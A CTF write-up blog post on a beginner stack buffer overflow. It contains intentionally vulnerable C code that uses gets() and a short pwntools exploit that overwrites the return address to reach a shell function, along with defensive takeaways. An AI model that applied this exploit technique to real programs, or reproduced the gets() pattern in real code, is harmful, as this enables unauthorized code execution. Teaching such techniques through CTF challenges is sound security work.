CTF Writeup: Binary Exploitation 101

2026-02-20 security ctf binary-exploitation

Challenge: pwn-easy

A simple binary exploitation challenge. The binary reads user input without bounds checking.

Analysis

First, let’s check the binary protections:

$ checksec ./vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE

No canary and no PIE — classic stack overflow target.

Vulnerable Code

void login() {
    char buf[64];
    printf("Enter password: ");
    gets(buf);  // vulnerable!
    if (strcmp(buf, SECRET) == 0) {
        printf("Access granted\n");
        shell();
    }
}

gets() reads without length check. We need to overflow buf to overwrite the return address.

Exploit

The offset to RIP is 72 bytes (64 buf + 8 saved RBP). Since NX is enabled, we can’t execute shellcode on the stack, but PIE is disabled so addresses are fixed.

from pwn import *

elf = ELF('./vuln')
p = process('./vuln')

payload = b'A' * 72
payload += p64(elf.symbols['shell'])

p.sendline(payload)
p.interactive()

Key Takeaways

  • Always check binary protections first
  • gets() is never safe — use fgets() with explicit size
  • Without stack canaries, simple buffer overflows are trivial
